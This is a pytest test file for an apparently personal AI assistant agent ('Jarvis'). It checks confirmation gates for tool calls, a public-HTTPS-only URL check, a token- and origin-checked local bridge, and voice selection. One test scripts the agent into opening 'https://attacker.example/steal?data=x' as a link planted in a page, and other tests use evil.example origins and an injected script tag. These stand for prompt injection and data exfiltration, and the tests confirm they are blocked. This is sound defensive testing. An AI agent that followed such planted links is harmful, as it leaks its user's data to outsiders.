"""Owner Jarvis's autonomy: what runs on its own, what waits for a yes, and the website bridge."""

from __future__ import annotations

import json
import urllib.request
from datetime import date
from pathlib import Path
from typing import Any
from urllib.error import HTTPError

import httpx
import pytest

from jarvis.knowledge import Brief
from jarvis.llm.base import AgentStep, ToolCall
from jarvis.llm.fake import ScriptedAgentSession
from jarvis.owner.agent import OwnerAgent
from jarvis.owner.bridge import load_token, page_context, serve
from jarvis.owner.confirm import DialogConfirmer
from jarvis.owner.mac import MacActions
from jarvis.owner.memory import AuditLog, Memory
from jarvis.owner.research import Research, UrlLedger, _public_https
from jarvis.owner.site import Entry, SiteIndex, opening_line, status_report
from jarvis.owner.tools import build_registry
from jarvis.owner.voice import is_yes, pick_voice


class Recorder:
    def __init__(self) -> None:
        self.calls: list[list[str]] = []

    def __call__(self, argv: list[str]) -> str:
        self.calls.append(argv)
        return "ok"


class Asked:
    def __init__(self, answer: bool) -> None:
        self.answer = answer
        self.asked: list[str] = []

    def confirm(self, summary: str) -> bool:
        self.asked.append(summary)
        return self.answer


def resp(body: Any, *, text: str | None = None, kind: str = "application/json") -> httpx.Response:
    req = httpx.Request("GET", "https://example.org")
    if text is not None:
        return httpx.Response(200, text=text, headers={"content-type": kind}, request=req)
    return httpx.Response(200, json=body, request=req)


OPENALEX = {
    "results": [
        {
            "display_name": "Deflated Sharpe Ratio",
            "publication_year": 2014,
            "authorships": [{"author": {"display_name": "Bailey"}}],
            "cited_by_count": 500,
            "open_access": {"oa_url": "https://papers.example.org/dsr.pdf"},
            "primary_location": {"source": {"display_name": "J. Portfolio Mgmt"}},
        }
    ]
}
DDG = (
    '<a rel="nofollow" class="result__a" '
    'href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fa">'
    'Example <b>A</b></a><a class="result__snippet" href="x">A snippet</a>'
)


def setup(
    tmp_path: Path, brief: Brief, steps: list[AgentStep], answer: bool, autonomy: str = "standard"
) -> tuple[OwnerAgent, Asked, Recorder, UrlLedger]:
    ledger = UrlLedger()
    research = Research(
        ledger,
        tmp_path / "dl",
        get=lambda url, **kw: (
            resp(OPENALEX)
            if "openalex" in url
            else resp(
                None, text="<html><p>Hello page</p><script>evil()</script></html>", kind="text/html"
            )
        ),
        post=lambda url, **kw: resp(None, text=DDG, kind="text/html"),
        check_host=_public_https,
    )
    site = SiteIndex(
        [
            Entry(
                "p", "project", "Deal Lab", "https://siddharthbagga29.github.io/deal/", "NO-GO deal"
            )
        ],
        ledger,
    )
    rec = Recorder()
    tools = build_registry(
        brief,
        MacActions(runner=rec),
        Memory(tmp_path / "m.sqlite3"),
        "Work",
        research=research,
        site=site,
        repo=tmp_path,
        ledger=ledger,
        autonomy=autonomy,
    )
    asked = Asked(answer)
    agent = OwnerAgent(
        lambda: ScriptedAgentSession(steps), tools, asked, AuditLog(tmp_path / "a.jsonl")
    )  # type: ignore[arg-type]
    return agent, asked, rec, ledger


def call(name: str, **args: object) -> AgentStep:
    return AgentStep(text="", tool_calls=[ToolCall(id=f"c_{name}", name=name, arguments=args)])


def test_lookups_and_found_links_run_without_asking(tmp_path: Path, brief: Brief) -> None:
    steps = [
        call("search_papers", query="deflated sharpe"),
        call("open_url", url="https://papers.example.org/dsr.pdf"),  # found by search_papers
        call("site_lookup", query="deal lab"),
        call("open_url", url="https://siddharthbagga29.github.io/deal/"),
        AgentStep(text="Opened."),
    ]
    agent, asked, rec, _ = setup(tmp_path, brief, steps, answer=False)
    assert agent.handle("find me the deflated sharpe paper") == "Opened."
    assert asked.asked == []
    assert [c[-1] for c in rec.calls] == [
        "https://papers.example.org/dsr.pdf",
        "https://siddharthbagga29.github.io/deal/",
    ]


def test_unknown_links_and_writes_wait_for_a_yes(tmp_path: Path, brief: Brief) -> None:
    steps = [
        call("open_url", url="https://attacker.example/steal?data=x"),  # e.g. planted in a page
        call("remember", note="likes tea"),
        AgentStep(text="Done."),
    ]
    agent, asked, rec, _ = setup(tmp_path, brief, steps, answer=False)
    agent.handle("go")
    assert asked.asked == ["open https://attacker.example/steal?data=x", "remember: 'likes tea'"]
    assert rec.calls == []


def test_strict_mode_asks_for_everything_that_acts(tmp_path: Path, brief: Brief) -> None:
    steps = [call("open_url", url="https://github.com/siddharthbagga29"), AgentStep(text=".")]
    agent, asked, rec, _ = setup(tmp_path, brief, steps, answer=False, autonomy="strict")
    agent.handle("go")
    assert asked.asked == ["open https://github.com/siddharthbagga29"] and rec.calls == []


def test_research_parses_papers_web_and_pages(tmp_path: Path, brief: Brief) -> None:
    ledger = UrlLedger()
    r = Research(
        ledger,
        tmp_path,
        get=lambda url, **kw: (
            resp(OPENALEX)
            if "openalex" in url
            else resp(None, text="<html><p>Hello</p><script>x()</script></html>", kind="text/html")
        ),
        post=lambda url, **kw: resp(None, text=DDG, kind="text/html"),
        check_host=lambda _u: None,
    )
    assert "Deflated Sharpe Ratio (2014). Bailey; J. Portfolio Mgmt. Cited by 500." in r.papers("x")
    assert "https://example.com/a" in r.web("x") and ledger.trusted("https://example.com/a")
    assert r.read("https://example.org") == "Hello"


@pytest.mark.parametrize(
    "url",
    [
        "http://example.com",
        "https://localhost/x",
        "https://127.0.0.1/",
        "https://10.0.0.5/",
        "https://printer.local/",
    ],
)
def test_reading_is_public_https_only(url: str) -> None:
    with pytest.raises(ValueError):
        _public_https(url)


def test_status_report_and_proactive_opening(tmp_path: Path) -> None:
    (tmp_path / "portfolio" / "agent").mkdir(parents=True)
    (tmp_path / "portfolio" / "agent" / "tasks.json").write_text(
        json.dumps(
            {
                "tasks": [
                    {
                        "id": "a",
                        "title": "Ship voice",
                        "status": "done",
                        "due": "2026-10-01",
                        "completedAt": "2026-10-07",
                    },
                    {
                        "id": "b",
                        "title": "Verify Search Console",
                        "status": "blocked",
                        "due": "2026-10-09",
                        "blockedOn": "the HTML tag",
                        "link": "https://search.google.com/search-console",
                    },
                ]
            }
        )
    )
    ledger = UrlLedger()
    report = status_report(tmp_path, date(2026, 10, 8), ledger)
    assert report["recently_done"] == ["Ship voice"]
    assert report["next"][0]["due_in_days"] == 1
    assert ledger.trusted("https://search.google.com/search-console")
    line = opening_line(report, 9)
    assert line.startswith("Good morning.") and "I need the HTML tag from you" in line
    assert line.endswith("?")


def test_spoken_yes_is_strict() -> None:
    assert is_yes("Yes.") and is_yes("go ahead") and is_yes("Confirm!")
    assert not is_yes("yes but wait") and not is_yes("no") and not is_yes("")


def test_voice_picks_the_best_installed_british_voice() -> None:
    listing = "Daniel              en_GB    # Hello\nJamie (Premium)     en_GB    # Hello\n"
    assert pick_voice("auto", listing) == "Jamie (Premium)"
    assert pick_voice("auto", "Alex  en_US  # hi\n") == "Daniel"
    assert pick_voice("Serena", listing) == "Serena"


def test_dialog_confirmer_allows_only_an_explicit_click() -> None:
    assert DialogConfirmer(run=lambda _a: "Allow|false\n").confirm("x")
    assert not DialogConfirmer(run=lambda _a: "Allow|true").confirm("x")  # timed out
    assert not DialogConfirmer(run=lambda _a: "Cancel|false").confirm("x")


def test_bridge_needs_token_and_origin(tmp_path: Path) -> None:
    token = load_token(tmp_path)
    assert load_token(tmp_path) == token and (tmp_path / "bridge_token").stat().st_mode & 0o077 == 0
    seen: list[str] = []
    server = serve(
        lambda t: seen.append(t) or "On it.",
        {"/status": lambda: {"next": []}},
        token,
        ("https://site.example",),
        0,
    )
    port = server.server_address[1]

    def post(origin: str, auth: str) -> tuple[int, dict[str, Any]]:
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/ask",
            data=json.dumps(
                {"text": "open the deal lab", "page": {"title": "Home", "url": "u"}}
            ).encode(),
            headers={
                "Origin": origin,
                "Authorization": f"Bearer {auth}",
                "content-type": "application/json",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as r:  # noqa: S310 (local test server)
                return r.status, json.loads(r.read())
        except HTTPError as e:
            return e.code, {}

    try:
        assert post("https://site.example", token) == (200, {"reply": "On it."})
        assert post("https://site.example", "wrong")[0] == 403
        assert post("https://evil.example", token)[0] == 403
        assert "looking at 'Home'" in seen[0] and seen[0].endswith("open the deal lab")
    finally:
        server.shutdown()


def test_page_context_is_bounded_data() -> None:
    ctx = page_context({"title": "T", "url": "u", "text": "x" * 5000})
    assert len(ctx) < 1800 and ctx.startswith("[Siddharth is looking at 'T'")


def test_every_tool_has_a_level_and_writes_need_a_yes(tmp_path: Path) -> None:
    from jarvis.config import DEFAULT_BRIEF
    from jarvis.core.memory import Journal
    from jarvis.core.notify import Notifier
    from jarvis.core.tasks import TaskEngine
    from jarvis.owner.workflows import ResearchWorkflow

    ledger = UrlLedger()
    research = Research(ledger, tmp_path / "dl", check_host=_public_https)
    tasks = TaskEngine(tmp_path / "t.sqlite3")
    journal = Journal(tmp_path / "j.sqlite3")
    tools = build_registry(
        Brief.load(DEFAULT_BRIEF),
        MacActions(runner=Recorder()),
        Memory(tmp_path / "m.sqlite3"),
        "Work",
        research=research,
        site=SiteIndex([], ledger),
        repo=tmp_path,
        ledger=ledger,
        tasks=tasks,
        journal=journal,
        workflow=ResearchWorkflow(tasks, research, journal, Notifier(banners=False)),
    )
    assert len(tools) >= 18
    for name, tool in tools.items():
        assert 0 <= tool.level <= 3, name
    sample = {
        "create_calendar_event": {},
        "draft_email": {},
        "remember": {},
        "set_preference": {},
    }
    for name in sample:
        assert tools[name].level >= 2 and tools[name].gate({}), name
    assert not tools["search_papers"].gate({})
    assert tools["open_url"].gate({"url": "https://evil.example/x"})  # not found by Jarvis
